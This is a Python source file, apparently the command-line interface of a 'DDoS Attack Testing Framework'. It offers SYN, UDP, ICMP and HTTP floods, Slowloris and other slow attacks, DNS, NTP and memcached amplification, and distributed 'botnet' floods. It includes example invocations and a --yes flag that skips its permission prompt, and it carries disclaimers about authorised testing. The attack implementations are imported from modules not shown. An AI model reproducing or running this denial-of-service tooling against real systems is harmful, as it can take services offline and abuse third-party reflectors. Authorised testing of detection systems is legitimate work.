#!/usr/bin/env python3
"""
DDoS Attack Testing Framework - CLI Interface

⚠️  WARNING: For EDUCATIONAL/TESTING purposes ONLY
    Only use on systems you own or have explicit permission to test.
"""

import argparse
import sys
from .utils import Colors, log
from .layer3_attacks import SYNFlood, UDPFlood, ICMPFlood
from .layer7_attacks import HTTPFlood, Slowloris
from .amplification import DNSAmplification, NTPAmplification, MemcachedAmplification
from .slow_attacks import SlowPOST, SlowRead
from .distributed import DistributedAttack


def print_banner():
    """Print tool banner"""
    banner = f"""
{Colors.RED}{'='*70}{Colors.NC}
{Colors.RED}    DDoS Attack Testing Framework v2.0{Colors.NC}
{Colors.RED}    For Testing DDoS Detection Systems{Colors.NC}
{Colors.RED}{'='*70}{Colors.NC}
{Colors.YELLOW}⚠️  WARNING: Use ONLY on systems you own or have permission to test!{Colors.NC}
{Colors.RED}{'='*70}{Colors.NC}
"""
    print(banner)


def confirm_attack(target: str, port: int, attack_type: str) -> bool:
    """Ask for user confirmation"""
    print(f"\n{Colors.YELLOW}Target: {target}:{port}{Colors.NC}")
    print(f"{Colors.YELLOW}Attack: {attack_type.upper()}{Colors.NC}\n")
    
    response = input(f"{Colors.YELLOW}Do you have permission to attack this target? (yes/no): {Colors.NC}")
    return response.lower() == 'yes'


def main():
    """Main CLI entry point"""
    print_banner()
    
    parser = argparse.ArgumentParser(
        description='DDoS Attack Testing Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Types:
  Layer 3/4:
    syn              SYN Flood (requires sudo)
    udp              UDP Flood (requires sudo)
    icmp             ICMP Flood / Ping of Death (requires sudo)
  
  Layer 7:
    http             HTTP Flood (high volume)
    slowloris        Slowloris (slow headers)
    slow-post        Slow POST / R.U.D.Y
    slow-read        Slow Read
  
  Amplification:
    dns-amp          DNS Amplification
    ntp-amp          NTP Amplification
    memcached-amp    Memcached Amplification
  
  Distributed:
    distributed-syn  Distributed SYN Flood
    distributed-udp  Distributed UDP Flood
    distributed-http Distributed HTTP Flood

Examples:
  # SYN Flood (requires sudo)
  sudo python3 -m ddos_attacks.cli -t 192.168.1.100 -p 80 -a syn -d 60
  
  # HTTP Flood (no sudo needed)
  python3 -m ddos_attacks.cli -t 192.168.1.100 -p 80 -a http -d 60 --threads 200
  
  # Distributed attack with custom botnet size
  sudo python3 -m ddos_attacks.cli -t 192.168.1.100 -p 80 -a distributed-syn -d 60 --pool-size 500
  
  # Slowloris
  python3 -m ddos_attacks.cli -t 192.168.1.100 -p 80 -a slowloris -d 120 --connections 1000
        """
    )
    
    # Required arguments
    parser.add_argument('-t', '--target', required=True, help='Target IP or hostname')
    parser.add_argument('-p', '--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('-a', '--attack', required=True,
                       choices=[
                           'syn', 'udp', 'icmp',
                           'http', 'slowloris', 'slow-post', 'slow-read',
                           'dns-amp', 'ntp-amp', 'memcached-amp',
                           'distributed-syn', 'distributed-udp', 'distributed-http'
                       ],
                       help='Attack type')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds (default: 60)')
    
    # Optional arguments
    parser.add_argument('--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('--connections', type=int, default=500, help='Number of connections for slow attacks (default: 500)')
    parser.add_argument('--rate', default='flood', help='Packet rate: "flood" or number (default: flood)')
    parser.add_argument('--pool-size', type=int, default=100, help='Botnet IP pool size for distributed attacks (default: 100)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (less verbose)')
    parser.add_argument('--no-stats', action='store_true', help='Do not show statistics')
    parser.add_argument('--yes', action='store_true', help='Skip confirmation prompt')
    
    args = parser.parse_args()
    
    # Confirmation
    if not args.yes:
        if not confirm_attack(args.target, args.port, args.attack):
            print(f"{Colors.RED}Attack cancelled.{Colors.NC}")
            sys.exit(0)
    
    verbose = not args.quiet
    
    try:
        # Initialize attack
        attack = None
        
        if args.attack == 'syn':
            attack = SYNFlood(args.target, args.port, verbose)
            success = attack.execute(args.duration, rate=args.rate)
            
        elif args.attack == 'udp':
            attack = UDPFlood(args.target, args.port, verbose)
            success = attack.execute(args.duration, rate=args.rate)
            
        elif args.attack == 'icmp':
            attack = ICMPFlood(args.target, args.port, verbose)
            success = attack.execute(args.duration)
            
        elif args.attack == 'http':
            attack = HTTPFlood(args.target, args.port, verbose)
            success = attack.execute(args.duration, threads=args.threads)
            
        elif args.attack == 'slowloris':
            attack = Slowloris(args.target, args.port, verbose)
            success = attack.execute(args.duration, connections=args.connections)
            
        elif args.attack == 'slow-post':
            attack = SlowPOST(args.target, args.port, verbose)
            success = attack.execute(args.duration, connections=args.connections)
            
        elif args.attack == 'slow-read':
            attack = SlowRead(args.target, args.port, verbose)
            success = attack.execute(args.duration, connections=args.connections)
            
        elif args.attack == 'dns-amp':
            attack = DNSAmplification(args.target, args.port, verbose)
            success = attack.execute(args.duration, threads=args.threads)
            
        elif args.attack == 'ntp-amp':
            attack = NTPAmplification(args.target, args.port, verbose)
            success = attack.execute(args.duration, threads=args.threads)
            
        elif args.attack == 'memcached-amp':
            attack = MemcachedAmplification(args.target, args.port, verbose)
            success = attack.execute(args.duration, threads=args.threads)
            
        elif args.attack.startswith('distributed-'):
            attack_type = args.attack.replace('distributed-', '')
            attack = DistributedAttack(args.target, args.port, verbose, pool_size=args.pool_size)
            success = attack.execute(args.duration, attack_type=attack_type, threads=args.threads)
        
        # Show statistics
        if attack and not args.no_stats:
            attack.print_stats()
        
        if success:
            log('SUCCESS', f'{Colors.GREEN}✓ Attack completed successfully{Colors.NC}', verbose)
            sys.exit(0)
        else:
            log('ERROR', f'{Colors.RED}✗ Attack failed{Colors.NC}', verbose)
            sys.exit(1)
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}Attack interrupted by user{Colors.NC}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.RED}✗ Attack failed: {str(e)}{Colors.NC}")
        sys.exit(1)


if __name__ == '__main__':
    main()
